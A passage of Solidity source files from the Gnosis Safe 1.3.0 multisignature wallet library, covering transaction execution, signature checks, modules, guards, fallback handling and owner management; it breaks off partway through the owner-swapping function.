/src/node_modules/@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol
    | // SPDX-License-Identifier: LGPL-3.0-only
    | pragma solidity >=0.7.0 <0.9.0;
    | 
    | import "./base/ModuleManager.sol";
    | import "./base/OwnerManager.sol";
    | import "./base/FallbackManager.sol";
    | import "./base/GuardManager.sol";
    | import "./common/EtherPaymentFallback.sol";
    | import "./common/Singleton.sol";
    | import "./common/SignatureDecoder.sol";
    | import "./common/SecuredTokenTransfer.sol";
    | import "./common/StorageAccessible.sol";
    | import "./interfaces/ISignatureValidator.sol";
    | import "./external/GnosisSafeMath.sol";
    | 
    | /// @title Gnosis Safe - A multisignature wallet with support for confirmations using signed messages based on ERC191.
    | /// @author Stefan George - <stefan@gnosis.io>
    | /// @author Richard Meissner - <richard@gnosis.io>
    | contract GnosisSafe is
    |     EtherPaymentFallback,
    |     Singleton,
    |     ModuleManager,
    |     OwnerManager,
    |     SignatureDecoder,
    |     SecuredTokenTransfer,
    |     ISignatureValidatorConstants,
    |     FallbackManager,
    |     StorageAccessible,
    |     GuardManager
    | {
    |     using GnosisSafeMath for uint256;
    | 
    |     string public constant VERSION = "1.3.0";
    | 
    |     // keccak256(
    |     //     "EIP712Domain(uint256 chainId,address verifyingContract)"
    |     // );
    |     bytes32 private constant DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218;
    | 
    |     // keccak256(
    |     //     "SafeTx(address to,uint256 value,bytes data,uint8 operation,uint256 safeTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)"
    |     // );
    |     bytes32 private constant SAFE_TX_TYPEHASH = 0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8;
    | 
    |     event SafeSetup(address indexed initiator, address[] owners, uint256 threshold, address initializer, address fallbackHandler);
    |     event ApproveHash(bytes32 indexed approvedHash, address indexed owner);
    |     event SignMsg(bytes32 indexed msgHash);
    |     event ExecutionFailure(bytes32 txHash, uint256 payment);
    |     event ExecutionSuccess(bytes32 txHash, uint256 payment);
    | 
    |     uint256 public nonce;
    |     bytes32 private _deprecatedDomainSeparator;
    |     // Mapping to keep track of all message hashes that have been approve by ALL REQUIRED owners
    |     mapping(bytes32 => uint256) public signedMessages;
    |     // Mapping to keep track of all hashes (message or transaction) that have been approve by ANY owners
    |     mapping(address => mapping(bytes32 => uint256)) public approvedHashes;
    | 
    |     // This constructor ensures that this contract can only be used as a master copy for Proxy contracts
    |     constructor() {
    |         // By setting the threshold it is not possible to call setup anymore,
    |         // so we create a Safe with 0 owners and threshold 1.
    |         // This is an unusable Safe, perfect for the singleton
    |         threshold = 1;
    |     }
    | 
    |     /// @dev Setup function sets initial storage of contract.
    |     /// @param _owners List of Safe owners.
    |     /// @param _threshold Number of required confirmations for a Safe transaction.
    |     /// @param to Contract address for optional delegate call.
    |     /// @param data Data payload for optional delegate call.
    |     /// @param fallbackHandler Handler for fallback calls to this contract
    |     /// @param paymentToken Token that should be used for the payment (0 is ETH)
    |     /// @param payment Value that should be paid
    |     /// @param paymentReceiver Adddress that should receive the payment (or 0 if tx.origin)
    |     function setup(
    |         address[] calldata _owners,
    |         uint256 _threshold,
    |         address to,
    |         bytes calldata data,
    |         address fallbackHandler,
    |         address paymentToken,
    |         uint256 payment,
    |         address payable paymentReceiver
    |     ) external {
    |         // setupOwners checks if the Threshold is already set, therefore preventing that this method is called twice
    |         setupOwners(_owners, _threshold);
    |         if (fallbackHandler != address(0)) internalSetFallbackHandler(fallbackHandler);
    |         // As setupOwners can only be called if the contract has not been initialized we don't need a check for setupModules
    |         setupModules(to, data);
    | 
    |         if (payment > 0) {
    |             // To avoid running into issues with EIP-170 we reuse the handlePayment function (to avoid adjusting code of that has been verified we do not adjust the method itself)
    |             // baseGas = 0, gasPrice = 1 and gas = payment => amount = (payment + 0) * 1 = payment
    |             handlePayment(payment, 0, 1, paymentToken, paymentReceiver);
    |         }
    |         emit SafeSetup(msg.sender, _owners, _threshold, to, fallbackHandler);
    |     }
    | 
    |     /// @dev Allows to execute a Safe transaction confirmed by required number of owners and then pays the account that submitted the transaction.
    |     ///      Note: The fees are always transferred, even if the user transaction fails.
    |     /// @param to Destination address of Safe transaction.
    |     /// @param value Ether value of Safe transaction.
    |     /// @param data Data payload of Safe transaction.
    |     /// @param operation Operation type of Safe transaction.
    |     /// @param safeTxGas Gas that should be used for the Safe transaction.
    |     /// @param baseGas Gas costs that are independent of the transaction execution(e.g. base transaction fee, signature check, payment of the refund)
    |     /// @param gasPrice Gas price that should be used for the payment calculation.
    |     /// @param gasToken Token address (or 0 if ETH) that is used for the payment.
    |     /// @param refundReceiver Address of receiver of gas payment (or 0 if tx.origin).
    |     /// @param signatures Packed signature data ({bytes32 r}{bytes32 s}{uint8 v})
    |     function execTransaction(
    |         address to,
    |         uint256 value,
    |         bytes calldata data,
    |         Enum.Operation operation,
    |         uint256 safeTxGas,
    |         uint256 baseGas,
    |         uint256 gasPrice,
    |         address gasToken,
    |         address payable refundReceiver,
    |         bytes memory signatures
    |     ) public payable virtual returns (bool success) {
    |         bytes32 txHash;
    |         // Use scope here to limit variable lifetime and prevent `stack too deep` errors
    |         {
    |             bytes memory txHashData =
    |                 encodeTransactionData(
    |                     // Transaction info
    |                     to,
    |                     value,
    |                     data,
    |                     operation,
    |                     safeTxGas,
    |                     // Payment info
    |                     baseGas,
    |                     gasPrice,
    |                     gasToken,
    |                     refundReceiver,
    |                     // Signature info
    |                     nonce
    |                 );
    |             // Increase nonce and execute transaction.
    |             nonce++;
    |             txHash = keccak256(txHashData);
    |             checkSignatures(txHash, txHashData, signatures);
    |         }
    |         address guard = getGuard();
    |         {
    |             if (guard != address(0)) {
    |                 Guard(guard).checkTransaction(
    |                     // Transaction info
    |                     to,
    |                     value,
    |                     data,
    |                     operation,
    |                     safeTxGas,
    |                     // Payment info
    |                     baseGas,
    |                     gasPrice,
    |                     gasToken,
    |                     refundReceiver,
    |                     // Signature info
    |                     signatures,
    |                     msg.sender
    |                 );
    |             }
    |         }
    |         // We require some gas to emit the events (at least 2500) after the execution and some to perform code until the execution (500)
    |         // We also include the 1/64 in the check that is not send along with a call to counteract potential shortings because of EIP-150
    |         require(gasleft() >= ((safeTxGas * 64) / 63).max(safeTxGas + 2500) + 500, "GS010");
    |         // Use scope here to limit variable lifetime and prevent `stack too deep` errors
    |         {
    |             uint256 gasUsed = gasleft();
    |             // If the gasPrice is 0 we assume that nearly all available gas can be used (it is always more than safeTxGas)
    |             // We only substract 2500 (compared to the 3000 before) to ensure that the amount passed is still higher than safeTxGas
    |             success = execute(to, value, data, operation, gasPrice == 0 ? (gasleft() - 2500) : safeTxGas);
    |             gasUsed = gasUsed.sub(gasleft());
    |             // If no safeTxGas and no gasPrice was set (e.g. both are 0), then the internal tx is required to be successful
    |             // This makes it possible to use `estimateGas` without issues, as it searches for the minimum gas where the tx doesn't revert
    |             require(success || safeTxGas != 0 || gasPrice != 0, "GS013");
    |             // We transfer the calculated tx costs to the tx.origin to avoid sending it to intermediate contracts that have made calls
    |             uint256 payment = 0;
    |             if (gasPrice > 0) {
    |                 payment = handlePayment(gasUsed, baseGas, gasPrice, gasToken, refundReceiver);
    |             }
    |             if (success) emit ExecutionSuccess(txHash, payment);
    |             else emit ExecutionFailure(txHash, payment);
    |         }
    |         {
    |             if (guard != address(0)) {
    |                 Guard(guard).checkAfterExecution(txHash, success);
    |             }
    |         }
    |     }
    | 
    |     function handlePayment(
    |         uint256 gasUsed,
    |         uint256 baseGas,
    |         uint256 gasPrice,
    |         address gasToken,
    |         address payable refundReceiver
    |     ) private returns (uint256 payment) {
    |         // solhint-disable-next-line avoid-tx-origin
    |         address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;
    |         if (gasToken == address(0)) {
    |             // For ETH we will only adjust the gas price to not be higher than the actual used gas price
    |             payment = gasUsed.add(baseGas).mul(gasPrice < tx.gasprice ? gasPrice : tx.gasprice);
    |             require(receiver.send(payment), "GS011");
    |         } else {
    |             payment = gasUsed.add(baseGas).mul(gasPrice);
    |             require(transferToken(gasToken, receiver, payment), "GS012");
    |         }
    |     }
    | 
    |     /**
    |      * @dev Checks whether the signature provided is valid for the provided data, hash. Will revert otherwise.
    |      * @param dataHash Hash of the data (could be either a message hash or transaction hash)
    |      * @param data That should be signed (this is passed to an external validator contract)
    |      * @param signatures Signature data that should be verified. Can be ECDSA signature, contract signature (EIP-1271) or approved hash.
    |      */
    |     function checkSignatures(
    |         bytes32 dataHash,
    |         bytes memory data,
    |         bytes memory signatures
    |     ) public view {
    |         // Load threshold to avoid multiple storage loads
    |         uint256 _threshold = threshold;
    |         // Check that a threshold is set
    |         require(_threshold > 0, "GS001");
    |         checkNSignatures(dataHash, data, signatures, _threshold);
    |     }
    | 
    |     /**
    |      * @dev Checks whether the signature provided is valid for the provided data, hash. Will revert otherwise.
    |      * @param dataHash Hash of the data (could be either a message hash or transaction hash)
    |      * @param data That should be signed (this is passed to an external validator contract)
    |      * @param signatures Signature data that should be verified. Can be ECDSA signature, contract signature (EIP-1271) or approved hash.
    |      * @param requiredSignatures Amount of required valid signatures.
    |      */
    |     function checkNSignatures(
    |         bytes32 dataHash,
    |         bytes memory data,
    |         bytes memory signatures,
    |         uint256 requiredSignatures
    |     ) public view {
    |         // Check that the provided signature data is not too short
    |         require(signatures.length >= requiredSignatures.mul(65), "GS020");
    |         // There cannot be an owner with address 0.
    |         address lastOwner = address(0);
    |         address currentOwner;
    |         uint8 v;
    |         bytes32 r;
    |         bytes32 s;
    |         uint256 i;
    |         for (i = 0; i < requiredSignatures; i++) {
    |             (v, r, s) = signatureSplit(signatures, i);
    |             if (v == 0) {
    |                 // If v is 0 then it is a contract signature
    |                 // When handling contract signatures the address of the contract is encoded into r
    |                 currentOwner = address(uint160(uint256(r)));
    | 
    |                 // Check that signature data pointer (s) is not pointing inside the static part of the signatures bytes
    |                 // This check is not completely accurate, since it is possible that more signatures than the threshold are send.
    |                 // Here we only check that the pointer is not pointing inside the part that is being processed
    |                 require(uint256(s) >= requiredSignatures.mul(65), "GS021");
    | 
    |                 // Check that signature data pointer (s) is in bounds (points to the length of data -> 32 bytes)
    |                 require(uint256(s).add(32) <= signatures.length, "GS022");
    | 
    |                 // Check if the contract signature is in bounds: start of data is s + 32 and end is start + signature length
    |                 uint256 contractSignatureLen;
    |                 // solhint-disable-next-line no-inline-assembly
    |                 assembly {
    |                     contractSignatureLen := mload(add(add(signatures, s), 0x20))
    |                 }
    |                 require(uint256(s).add(32).add(contractSignatureLen) <= signatures.length, "GS023");
    | 
    |                 // Check signature
    |                 bytes memory contractSignature;
    |                 // solhint-disable-next-line no-inline-assembly
    |                 assembly {
    |                     // The signature data for contract signatures is appended to the concatenated signatures and the offset is stored in s
    |                     contractSignature := add(add(signatures, s), 0x20)
    |                 }
    |                 require(ISignatureValidator(currentOwner).isValidSignature(data, contractSignature) == EIP1271_MAGIC_VALUE, "GS024");
    |             } else if (v == 1) {
    |                 // If v is 1 then it is an approved hash
    |                 // When handling approved hashes the address of the approver is encoded into r
    |                 currentOwner = address(uint160(uint256(r)));
    |                 // Hashes are automatically approved by the sender of the message or when they have been pre-approved via a separate transaction
    |                 require(msg.sender == currentOwner || approvedHashes[currentOwner][dataHash] != 0, "GS025");
    |             } else if (v > 30) {
    |                 // If v > 30 then default va (27,28) has been adjusted for eth_sign flow
    |                 // To support eth_sign and similar we adjust v and hash the messageHash with the Ethereum message prefix before applying ecrecover
    |                 currentOwner = ecrecover(keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", dataHash)), v - 4, r, s);
    |             } else {
    |                 // Default is the ecrecover flow with the provided data hash
    |                 // Use ecrecover with the messageHash for EOA signatures
    |                 currentOwner = ecrecover(dataHash, v, r, s);
    |             }
    |             require(currentOwner > lastOwner && owners[currentOwner] != address(0) && currentOwner != SENTINEL_OWNERS, "GS026");
    |             lastOwner = currentOwner;
    |         }
    |     }
    | 
    |     /// @dev Allows to estimate a Safe transaction.
    |     ///      This method is only meant for estimation purpose, therefore the call will always revert and encode the result in the revert data.
    |     ///      Since the `estimateGas` function includes refunds, call this method to get an estimated of the costs that are deducted from the safe with `execTransaction`
    |     /// @param to Destination address of Safe transaction.
    |     /// @param value Ether value of Safe transaction.
    |     /// @param data Data payload of Safe transaction.
    |     /// @param operation Operation type of Safe transaction.
    |     /// @return Estimate without refunds and overhead fees (base transaction and payload data gas costs).
    |     /// @notice Deprecated in favor of common/StorageAccessible.sol and will be removed in next version.
    |     function requiredTxGas(
    |         address to,
    |         uint256 value,
    |         bytes calldata data,
    |         Enum.Operation operation
    |     ) external returns (uint256) {
    |         uint256 startGas = gasleft();
    |         // We don't provide an error message here, as we use it to return the estimate
    |         require(execute(to, value, data, operation, gasleft()));
    |         uint256 requiredGas = startGas - gasleft();
    |         // Convert response to string and return via error message
    |         revert(string(abi.encodePacked(requiredGas)));
    |     }
    | 
    |     /**
    |      * @dev Marks a hash as approved. This can be used to validate a hash that is used by a signature.
    |      * @param hashToApprove The hash that should be marked as approved for signatures that are verified by this contract.
    |      */
    |     function approveHash(bytes32 hashToApprove) external {
    |         require(owners[msg.sender] != address(0), "GS030");
    |         approvedHashes[msg.sender][hashToApprove] = 1;
    |         emit ApproveHash(hashToApprove, msg.sender);
    |     }
    | 
    |     /// @dev Returns the chain id used by this contract.
    |     function getChainId() public view returns (uint256) {
    |         uint256 id;
    |         // solhint-disable-next-line no-inline-assembly
    |         assembly {
    |             id := chainid()
    |         }
    |         return id;
    |     }
    | 
    |     function domainSeparator() public view returns (bytes32) {
    |         return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), this));
    |     }
    | 
    |     /// @dev Returns the bytes that are hashed to be signed by owners.
    |     /// @param to Destination address.
    |     /// @param value Ether value.
    |     /// @param data Data payload.
    |     /// @param operation Operation type.
    |     /// @param safeTxGas Gas that should be used for the safe transaction.
    |     /// @param baseGas Gas costs for that are independent of the transaction execution(e.g. base transaction fee, signature check, payment of the refund)
    |     /// @param gasPrice Maximum gas price that should be used for this transaction.
    |     /// @param gasToken Token address (or 0 if ETH) that is used for the payment.
    |     /// @param refundReceiver Address of receiver of gas payment (or 0 if tx.origin).
    |     /// @param _nonce Transaction nonce.
    |     /// @return Transaction hash bytes.
    |     function encodeTransactionData(
    |         address to,
    |         uint256 value,
    |         bytes calldata data,
    |         Enum.Operation operation,
    |         uint256 safeTxGas,
    |         uint256 baseGas,
    |         uint256 gasPrice,
    |         address gasToken,
    |         address refundReceiver,
    |         uint256 _nonce
    |     ) public view returns (bytes memory) {
    |         bytes32 safeTxHash =
    |             keccak256(
    |                 abi.encode(
    |                     SAFE_TX_TYPEHASH,
    |                     to,
    |                     value,
    |                     keccak256(data),
    |                     operation,
    |                     safeTxGas,
    |                     baseGas,
    |                     gasPrice,
    |                     gasToken,
    |                     refundReceiver,
    |                     _nonce
    |                 )
    |             );
    |         return abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator(), safeTxHash);
    |     }
    | 
    |     /// @dev Returns hash to be signed by owners.
    |     /// @param to Destination address.
    |     /// @param value Ether value.
    |     /// @param data Data payload.
    |     /// @param operation Operation type.
    |     /// @param safeTxGas Fas that should be used for the safe transaction.
    |     /// @param baseGas Gas costs for data used to trigger the safe transaction.
    |     /// @param gasPrice Maximum gas price that should be used for this transaction.
    |     /// @param gasToken Token address (or 0 if ETH) that is used for the payment.
    |     /// @param refundReceiver Address of receiver of gas payment (or 0 if tx.origin).
    |     /// @param _nonce Transaction nonce.
    |     /// @return Transaction hash.
    |     function getTransactionHash(
    |         address to,
    |         uint256 value,
    |         bytes calldata data,
    |         Enum.Operation operation,
    |         uint256 safeTxGas,
    |         uint256 baseGas,
    |         uint256 gasPrice,
    |         address gasToken,
    |         address refundReceiver,
    |         uint256 _nonce
    |     ) public view returns (bytes32) {
    |         return keccak256(encodeTransactionData(to, value, data, operation, safeTxGas, baseGas, gasPrice, gasToken, refundReceiver, _nonce));
    |     }
    | }
    | 

/src/node_modules/@gnosis.pm/safe-contracts/contracts/base/Executor.sol
    | // SPDX-License-Identifier: LGPL-3.0-only
    | pragma solidity >=0.7.0 <0.9.0;
    | import "../common/Enum.sol";
    | 
    | /// @title Executor - A contract that can execute transactions
    | /// @author Richard Meissner - <richard@gnosis.pm>
    | contract Executor {
    |     function execute(
    |         address to,
    |         uint256 value,
    |         bytes memory data,
    |         Enum.Operation operation,
    |         uint256 txGas
    |     ) internal returns (bool success) {
    |         if (operation == Enum.Operation.DelegateCall) {
    |             // solhint-disable-next-line no-inline-assembly
    |             assembly {
    |                 success := delegatecall(txGas, to, add(data, 0x20), mload(data), 0, 0)
    |             }
    |         } else {
    |             // solhint-disable-next-line no-inline-assembly
    |             assembly {
    |                 success := call(txGas, to, value, add(data, 0x20), mload(data), 0, 0)
    |             }
    |         }
    |     }
    | }
    | 

/src/node_modules/@gnosis.pm/safe-contracts/contracts/base/FallbackManager.sol
    | // SPDX-License-Identifier: LGPL-3.0-only
    | pragma solidity >=0.7.0 <0.9.0;
    | 
    | import "../common/SelfAuthorized.sol";
    | 
    | /// @title Fallback Manager - A contract that manages fallback calls made to this contract
    | /// @author Richard Meissner - <richard@gnosis.pm>
    | contract FallbackManager is SelfAuthorized {
    |     event ChangedFallbackHandler(address handler);
    | 
    |     // keccak256("fallback_manager.handler.address")
    |     bytes32 internal constant FALLBACK_HANDLER_STORAGE_SLOT = 0x6c9a6c4a39284e37ed1cf53d337577d14212a4870fb976a4366c693b939918d5;
    | 
    |     function internalSetFallbackHandler(address handler) internal {
    |         bytes32 slot = FALLBACK_HANDLER_STORAGE_SLOT;
    |         // solhint-disable-next-line no-inline-assembly
    |         assembly {
    |             sstore(slot, handler)
    |         }
    |     }
    | 
    |     /// @dev Allows to add a contract to handle fallback calls.
    |     ///      Only fallback calls without value and with data will be forwarded.
    |     ///      This can only be done via a Safe transaction.
    |     /// @param handler contract to handle fallbacks calls.
    |     function setFallbackHandler(address handler) public authorized {
    |         internalSetFallbackHandler(handler);
    |         emit ChangedFallbackHandler(handler);
    |     }
    | 
    |     // solhint-disable-next-line payable-fallback,no-complex-fallback
    |     fallback() external {
    |         bytes32 slot = FALLBACK_HANDLER_STORAGE_SLOT;
    |         // solhint-disable-next-line no-inline-assembly
    |         assembly {
    |             let handler := sload(slot)
    |             if iszero(handler) {
    |                 return(0, 0)
    |             }
    |             calldatacopy(0, 0, calldatasize())
    |             // The msg.sender address is shifted to the left by 12 bytes to remove the padding
    |             // Then the address without padding is stored right after the calldata
    |             mstore(calldatasize(), shl(96, caller()))
    |             // Add 20 bytes for the address appended add the end
    |             let success := call(gas(), handler, 0, 0, add(calldatasize(), 20), 0, 0)
    |             returndatacopy(0, 0, returndatasize())
    |             if iszero(success) {
    |                 revert(0, returndatasize())
    |             }
    |             return(0, returndatasize())
    |         }
    |     }
    | }
    | 

/src/node_modules/@gnosis.pm/safe-contracts/contracts/base/GuardManager.sol
    | // SPDX-License-Identifier: LGPL-3.0-only
    | pragma solidity >=0.7.0 <0.9.0;
    | 
    | import "../common/Enum.sol";
    | import "../common/SelfAuthorized.sol";
    | 
    | interface Guard {
    |     function checkTransaction(
    |         address to,
    |         uint256 value,
    |         bytes memory data,
    |         Enum.Operation operation,
    |         uint256 safeTxGas,
    |         uint256 baseGas,
    |         uint256 gasPrice,
    |         address gasToken,
    |         address payable refundReceiver,
    |         bytes memory signatures,
    |         address msgSender
    |     ) external;
    | 
    |     function checkAfterExecution(bytes32 txHash, bool success) external;
    | }
    | 
    | /// @title Fallback Manager - A contract that manages fallback calls made to this contract
    | /// @author Richard Meissner - <richard@gnosis.pm>
    | contract GuardManager is SelfAuthorized {
    |     event ChangedGuard(address guard);
    |     // keccak256("guard_manager.guard.address")
    |     bytes32 internal constant GUARD_STORAGE_SLOT = 0x4a204f620c8c5ccdca3fd54d003badd85ba500436a431f0cbda4f558c93c34c8;
    | 
    |     /// @dev Set a guard that checks transactions before execution
    |     /// @param guard The address of the guard to be used or the 0 address to disable the guard
    |     function setGuard(address guard) external authorized {
    |         bytes32 slot = GUARD_STORAGE_SLOT;
    |         // solhint-disable-next-line no-inline-assembly
    |         assembly {
    |             sstore(slot, guard)
    |         }
    |         emit ChangedGuard(guard);
    |     }
    | 
    |     function getGuard() internal view returns (address guard) {
    |         bytes32 slot = GUARD_STORAGE_SLOT;
    |         // solhint-disable-next-line no-inline-assembly
    |         assembly {
    |             guard := sload(slot)
    |         }
    |     }
    | }
    | 

/src/node_modules/@gnosis.pm/safe-contracts/contracts/base/ModuleManager.sol
    | // SPDX-License-Identifier: LGPL-3.0-only
    | pragma solidity >=0.7.0 <0.9.0;
    | import "../common/Enum.sol";
    | import "../common/SelfAuthorized.sol";
    | import "./Executor.sol";
    | 
    | /// @title Module Manager - A contract that manages modules that can execute transactions via this contract
    | /// @author Stefan George - <stefan@gnosis.pm>
    | /// @author Richard Meissner - <richard@gnosis.pm>
    | contract ModuleManager is SelfAuthorized, Executor {
    |     event EnabledModule(address module);
    |     event DisabledModule(address module);
    |     event ExecutionFromModuleSuccess(address indexed module);
    |     event ExecutionFromModuleFailure(address indexed module);
    | 
    |     address internal constant SENTINEL_MODULES = address(0x1);
    | 
    |     mapping(address => address) internal modules;
    | 
    |     function setupModules(address to, bytes memory data) internal {
    |         require(modules[SENTINEL_MODULES] == address(0), "GS100");
    |         modules[SENTINEL_MODULES] = SENTINEL_MODULES;
    |         if (to != address(0))
    |             // Setup has to complete successfully or transaction fails.
    |             require(execute(to, 0, data, Enum.Operation.DelegateCall, gasleft()), "GS000");
    |     }
    | 
    |     /// @dev Allows to add a module to the whitelist.
    |     ///      This can only be done via a Safe transaction.
    |     /// @notice Enables the module `module` for the Safe.
    |     /// @param module Module to be whitelisted.
    |     function enableModule(address module) public authorized {
    |         // Module address cannot be null or sentinel.
    |         require(module != address(0) && module != SENTINEL_MODULES, "GS101");
    |         // Module cannot be added twice.
    |         require(modules[module] == address(0), "GS102");
    |         modules[module] = modules[SENTINEL_MODULES];
    |         modules[SENTINEL_MODULES] = module;
    |         emit EnabledModule(module);
    |     }
    | 
    |     /// @dev Allows to remove a module from the whitelist.
    |     ///      This can only be done via a Safe transaction.
    |     /// @notice Disables the module `module` for the Safe.
    |     /// @param prevModule Module that pointed to the module to be removed in the linked list
    |     /// @param module Module to be removed.
    |     function disableModule(address prevModule, address module) public authorized {
    |         // Validate module address and check that it corresponds to module index.
    |         require(module != address(0) && module != SENTINEL_MODULES, "GS101");
    |         require(modules[prevModule] == module, "GS103");
    |         modules[prevModule] = modules[module];
    |         modules[module] = address(0);
    |         emit DisabledModule(module);
    |     }
    | 
    |     /// @dev Allows a Module to execute a Safe transaction without any further confirmations.
    |     /// @param to Destination address of module transaction.
    |     /// @param value Ether value of module transaction.
    |     /// @param data Data payload of module transaction.
    |     /// @param operation Operation type of module transaction.
    |     function execTransactionFromModule(
    |         address to,
    |         uint256 value,
    |         bytes memory data,
    |         Enum.Operation operation
    |     ) public virtual returns (bool success) {
    |         // Only whitelisted modules are allowed.
    |         require(msg.sender != SENTINEL_MODULES && modules[msg.sender] != address(0), "GS104");
    |         // Execute transaction without further confirmations.
    |         success = execute(to, value, data, operation, gasleft());
    |         if (success) emit ExecutionFromModuleSuccess(msg.sender);
    |         else emit ExecutionFromModuleFailure(msg.sender);
    |     }
    | 
    |     /// @dev Allows a Module to execute a Safe transaction without any further confirmations and return data
    |     /// @param to Destination address of module transaction.
    |     /// @param value Ether value of module transaction.
    |     /// @param data Data payload of module transaction.
    |     /// @param operation Operation type of module transaction.
    |     function execTransactionFromModuleReturnData(
    |         address to,
    |         uint256 value,
    |         bytes memory data,
    |         Enum.Operation operation
    |     ) public returns (bool success, bytes memory returnData) {
    |         success = execTransactionFromModule(to, value, data, operation);
    |         // solhint-disable-next-line no-inline-assembly
    |         assembly {
    |             // Load free memory location
    |             let ptr := mload(0x40)
    |             // We allocate memory for the return data by setting the free memory location to
    |             // current free memory location + data size + 32 bytes for data size value
    |             mstore(0x40, add(ptr, add(returndatasize(), 0x20)))
    |             // Store the size
    |             mstore(ptr, returndatasize())
    |             // Store the data
    |             returndatacopy(add(ptr, 0x20), 0, returndatasize())
    |             // Point the return data to the correct memory location
    |             returnData := ptr
    |         }
    |     }
    | 
    |     /// @dev Returns if an module is enabled
    |     /// @return True if the module is enabled
    |     function isModuleEnabled(address module) public view returns (bool) {
    |         return SENTINEL_MODULES != module && modules[module] != address(0);
    |     }
    | 
    |     /// @dev Returns array of modules.
    |     /// @param start Start of the page.
    |     /// @param pageSize Maximum number of modules that should be returned.
    |     /// @return array Array of modules.
    |     /// @return next Start of the next page.
    |     function getModulesPaginated(address start, uint256 pageSize) external view returns (address[] memory array, address next) {
    |         // Init array with max page size
    |         array = new address[](pageSize);
    | 
    |         // Populate return array
    |         uint256 moduleCount = 0;
    |         address currentModule = modules[start];
    |         while (currentModule != address(0x0) && currentModule != SENTINEL_MODULES && moduleCount < pageSize) {
    |             array[moduleCount] = currentModule;
    |             currentModule = modules[currentModule];
    |             moduleCount++;
    |         }
    |         next = currentModule;
    |         // Set correct size of returned array
    |         // solhint-disable-next-line no-inline-assembly
    |         assembly {
    |             mstore(array, moduleCount)
    |         }
    |     }
    | }
    | 

/src/node_modules/@gnosis.pm/safe-contracts/contracts/base/OwnerManager.sol
    | // SPDX-License-Identifier: LGPL-3.0-only
    | pragma solidity >=0.7.0 <0.9.0;
    | import "../common/SelfAuthorized.sol";
    | 
    | /// @title OwnerManager - Manages a set of owners and a threshold to perform actions.
    | /// @author Stefan George - <stefan@gnosis.pm>
    | /// @author Richard Meissner - <richard@gnosis.pm>
    | contract OwnerManager is SelfAuthorized {
    |     event AddedOwner(address owner);
    |     event RemovedOwner(address owner);
    |     event ChangedThreshold(uint256 threshold);
    | 
    |     address internal constant SENTINEL_OWNERS = address(0x1);
    | 
    |     mapping(address => address) internal owners;
    |     uint256 internal ownerCount;
    |     uint256 internal threshold;
    | 
    |     /// @dev Setup function sets initial storage of contract.
    |     /// @param _owners List of Safe owners.
    |     /// @param _threshold Number of required confirmations for a Safe transaction.
    |     function setupOwners(address[] memory _owners, uint256 _threshold) internal {
    |         // Threshold can only be 0 at initialization.
    |         // Check ensures that setup function can only be called once.
    |         require(threshold == 0, "GS200");
    |         // Validate that threshold is smaller than number of added owners.
    |         require(_threshold <= _owners.length, "GS201");
    |         // There has to be at least one Safe owner.
    |         require(_threshold >= 1, "GS202");
    |         // Initializing Safe owners.
    |         address currentOwner = SENTINEL_OWNERS;
    |         for (uint256 i = 0; i < _owners.length; i++) {
    |             // Owner address cannot be null.
    |             address owner = _owners[i];
    |             require(owner != address(0) && owner != SENTINEL_OWNERS && owner != address(this) && currentOwner != owner, "GS203");
    |             // No duplicate owners allowed.
    |             require(owners[owner] == address(0), "GS204");
    |             owners[currentOwner] = owner;
    |             currentOwner = owner;
    |         }
    |         owners[currentOwner] = SENTINEL_OWNERS;
    |         ownerCount = _owners.length;
    |         threshold = _threshold;
    |     }
    | 
    |     /// @dev Allows to add a new owner to the Safe and update the threshold at the same time.
    |     ///      This can only be done via a Safe transaction.
    |     /// @notice Adds the owner `owner` to the Safe and updates the threshold to `_threshold`.
    |     /// @param owner New owner address.
    |     /// @param _threshold New threshold.
    |     function addOwnerWithThreshold(address owner, uint256 _threshold) public authorized {
    |         // Owner address cannot be null, the sentinel or the Safe itself.
    |         require(owner != address(0) && owner != SENTINEL_OWNERS && owner != address(this), "GS203");
    |         // No duplicate owners allowed.
    |         require(owners[owner] == address(0), "GS204");
    |         owners[owner] = owners[SENTINEL_OWNERS];
    |         owners[SENTINEL_OWNERS] = owner;
    |         ownerCount++;
    |         emit AddedOwner(owner);
    |         // Change threshold if threshold was changed.
    |         if (threshold != _threshold) changeThreshold(_threshold);
    |     }
    | 
    |     /// @dev Allows to remove an owner from the Safe and update the threshold at the same time.
    |     ///      This can only be done via a Safe transaction.
    |     /// @notice Removes the owner `owner` from the Safe and updates the threshold to `_threshold`.
    |     /// @param prevOwner Owner that pointed to the owner to be removed in the linked list
    |     /// @param owner Owner address to be removed.
    |     /// @param _threshold New threshold.
    |     function removeOwner(
    |         address prevOwner,
    |         address owner,
    |         uint256 _threshold
    |     ) public authorized {
    |         // Only allow to remove an owner, if threshold can still be reached.
    |         require(ownerCount - 1 >= _threshold, "GS201");
    |         // Validate owner address and check that it corresponds to owner index.
    |         require(owner != address(0) && owner != SENTINEL_OWNERS, "GS203");
    |         require(owners[prevOwner] == owner, "GS205");
    |         owners[prevOwner] = owners[owner];
    |         owners[owner] = address(0);
    |         ownerCount--;
    |         emit RemovedOwner(owner);
    |         // Change threshold if threshold was changed.
    |         if (threshold != _threshold) changeThreshold(_threshold);
    |     }
    | 
    |     /// @dev Allows to swap/replace an owner from the Safe with another address.
    |     ///      This can only be done via a Safe transaction.
    |     /// @notice Replaces the owner `oldOwner` in the Safe with `newOwner`.
    |     /// @param prevOwner Owner that pointed to the owner to be replaced in the linked list
    |     /// @param oldOwner Owner address to be replaced.
    |     /// @param newOwner New owner address.
    |     function swapOwner(
    |         address prevOwner,
    |         address oldOwner,
    |         address newOwner
    |     ) public authorized {
    |         // Owner address cannot be null, the sentinel or the Safe itself.
    |         require(newOwner != address(0) && newOwner != SENTINEL_OWNERS && newOwner != address(this), "GS203");
    |         // No duplicate owners allowed.
    |         require(owners[newOwner] == address(0), "GS204");
    |         // Validate oldOwner address and check that it corresponds to owner index.
    |         require(oldOwner != address(0) && oldOwner != SENTINEL_OWNERS, "GS203");
    |         require(owners[prevOwner] == oldOwner, "GS205");
